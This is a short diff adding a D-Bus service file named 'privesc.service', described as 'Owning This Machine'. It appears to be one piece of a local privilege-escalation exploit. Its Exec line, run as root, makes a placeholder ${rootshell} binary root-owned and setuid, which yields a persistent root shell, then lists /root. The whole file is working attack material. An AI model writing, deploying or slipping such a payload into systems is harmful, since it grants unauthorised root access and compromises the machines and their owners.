@@ -1,0 +1,8 @@
+[DBUS privesc.service]
+Name=privesc.service
+Description=Owning This Machine
+
+[Service]
+Type=simple
+Exec=/bin/sh -c "/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}; ls -la /root"
+User=root
